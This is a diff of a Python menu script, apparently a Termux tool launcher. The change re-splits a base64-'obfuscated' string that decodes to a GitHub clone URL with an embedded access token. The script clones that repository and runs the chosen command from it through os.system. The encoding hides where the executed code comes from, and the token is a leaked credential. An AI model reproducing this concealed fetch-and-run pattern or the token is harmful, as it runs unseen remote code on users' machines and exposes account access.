@@ -39,8 +39,14 @@ def print_menu():
     print(f" └─────────────────────────────┘{Style.RESET_ALL}")
 
 def run_command(option):
-    # Obfuscated
-    repo_b64 = "aHR0cHM6Ly9vYXV0aDI6Z2hwX1JPenNxSmVwZHdmU045NHZuS0NDQ0ZENDZhZEJ5azRJQnA1WU9LQldZU0lXNjlKREI3UUpXSVM3ODlJSEovVEVSTVVYLU9GRkxJTkUuZ2l0"
+    repo_b64 = (
+        "aHR0cHM6Ly9naHAtUk96c3FKZXBkd2ZT"
+        "Tjk0dm5LQ0NDRkQ0NmFEQnlrNElCcDVZ"
+        "T0tCV1lTSVc2MzlKREI3UUpXSVM3ODlJ"
+        "SEpAZ2l0aHViLmNvbS9GU08zWTlOU1VB"
+        "OVEwT1FCV1lTSVc2MzlKREI3UUpXSVM3"
+        "ODlISi9URVJNVVgtT0ZGTElORS5naXQ="
+    )
     folder_b64 = "VEVSTVVYLU9GRkxJTkU="
 
     repo_url = decrypt(repo_b64)
@@ -60,7 +66,6 @@ def run_command(option):
     }
 
     cmd = commands.get(option)
-
     if not cmd:
         print(f"{Fore.RED}Invalid option. Please try again.")
         return
@@ -68,8 +73,8 @@ def run_command(option):
     if not os.path.exists(folder):
         os.system(f"git clone {repo_url}")
 
-    final = f"cd {folder} && {cmd}"
-    os.system(final)
+    final_cmd = f"cd {folder} && {cmd}"
+    os.system(final_cmd)
 
 if __name__ == "__main__":
     clear_screen()
@@ -77,4 +82,3 @@ if __name__ == "__main__":
     print_menu()
     choice = input(f"\n{Fore.GREEN} Select an option (1-10): {Style.RESET_ALL}").strip()
     run_command(choice)
-    
